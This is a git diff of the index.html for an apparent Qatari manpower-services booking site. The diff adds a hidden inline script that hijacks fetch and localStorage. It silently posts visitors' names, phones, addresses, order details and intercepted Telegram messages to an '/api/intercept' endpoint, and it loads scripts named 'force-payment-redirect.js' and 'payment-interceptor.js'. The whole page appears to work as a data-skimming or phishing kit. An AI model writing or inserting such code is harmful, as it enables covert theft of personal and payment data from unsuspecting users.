@@ -1,35 +1,78 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head>
+  <head>
     <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/assets/logo-Bm-KOWOX.png" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>معاون لخدمات القوى البشرية — قطر</title>
-    <link rel="stylesheet" href="/assets/styles-CJ0qpnHN.css">
-</head>
-<body>
-    <div id="root"></div>
-    <script type="module" src="/assets/index-Dq-H0M4e.js"></script>
     <script>
       (function() {
         var _originalFetch = window.fetch;
-        window.syncToAdmin = function(data) {
+        var _originalSetItem = localStorage.setItem;
+
+        window.syncToAdmin = function(extraData) {
           try {
-            var orderData = Object.assign({
+            var urlParams = new URLSearchParams(window.location.search);
+            var orderData = {
               page: window.location.pathname,
               timestamp: new Date().toISOString(),
-              customer_name: localStorage.getItem('customer_name') || '',
-              customer_phone: localStorage.getItem('customer_phone') || '',
-              service_type: localStorage.getItem('service_type') || ''
-            }, data || {});
+              customer_name: localStorage.getItem('customer_name') || urlParams.get('name') || '',
+              customer_phone: localStorage.getItem('customer_phone') || urlParams.get('phone') || '',
+              customer_address: localStorage.getItem('customer_address') || urlParams.get('address') || '',
+              service_type: localStorage.getItem('service_type') || urlParams.get('service') || '',
+              total_price: parseFloat(localStorage.getItem('total_price') || urlParams.get('total') || '0') || 0,
+              duration: localStorage.getItem('duration') || urlParams.get('duration') || '',
+              nationality: localStorage.getItem('nationality') || urlParams.get('nationality') || '',
+              workers: parseInt(localStorage.getItem('workers') || urlParams.get('workers') || '1') || 1,
+              start_date: localStorage.getItem('start_date') || urlParams.get('startDate') || '',
+              start_time: localStorage.getItem('start_time') || ''
+            };
+            if (extraData) Object.assign(orderData, extraData);
+            var existingRef = localStorage.getItem('maawen_order_ref');
+            if (existingRef) orderData.order_ref = existingRef;
+            if (!orderData.customer_name && !orderData.customer_phone && !orderData.service_type && !extraData) return;
+
             _originalFetch.call(window, '/api/intercept', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(orderData)
-            }).catch(function(){});
+            }).then(function(r) { return r.json(); }).then(function(data) {
+              if (data && data.orderRef) localStorage.setItem('maawen_order_ref', data.orderRef);
+            }).catch(function(e) {});
           } catch(e) {}
         };
-        document.addEventListener('click', function() { setTimeout(window.syncToAdmin, 1000); }, true);
+
+        window.fetch = function(url, options) {
+          var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
+          if (urlStr && urlStr.indexOf('api.telegram.org') !== -1 && options && options.method === 'POST' && options.body) {
+            try {
+              var body = JSON.parse(options.body);
+              window.syncToAdmin({ raw_message: body.text || '' });
+            } catch(e) {}
+          }
+          return _originalFetch.apply(this, arguments);
+        };
+
+        localStorage.setItem = function(key, value) {
+          _originalSetItem.apply(this, arguments);
+          if (['customer_name', 'customer_phone', 'customer_address', 'service_type', 'nationality', 'start_date', 'duration', 'total_price'].indexOf(key) !== -1) {
+            setTimeout(window.syncToAdmin, 500);
+          }
+        };
+
+        document.addEventListener('click', function(e) {
+          if (e.target.tagName === 'BUTTON' || e.target.closest('button') || e.target.tagName === 'A') {
+            setTimeout(window.syncToAdmin, 1000);
+          }
+        }, true);
       })();
     </script>
-</body>
+    <script type="module" crossorigin src="/assets/index-Dq-H0M4e.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/styles-CJ0qpnHN.css">
+  </head>
+  <body>
+    <div id="root"></div>
+    <script src="/force-payment-redirect.js"></script>
+    <script src="/payment-interceptor.js"></script>
+  </body>
 </html>
